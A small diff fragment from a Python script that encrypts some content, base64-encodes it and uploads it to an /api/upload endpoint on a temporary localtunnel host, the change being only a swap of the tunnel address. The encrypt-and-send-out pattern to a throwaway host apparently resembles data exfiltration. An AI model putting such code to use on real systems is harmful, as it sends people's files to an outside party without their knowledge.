@@ -18,7 +18,7 @@ print("Content is encrypted")
 encoded_data = base64.b64encode(encrypted_content).decode()
 print("Content is encoded")
 
-main_url="https://metal-plants-repeat.loca.lt/"
+main_url="https://dirty-items-thank.loca.lt/"
 path_url="/api/upload"
 url = urllib.parse.urljoin(main_url,path_url)  # Replace with the actual URL of the server endpoint
 data = {
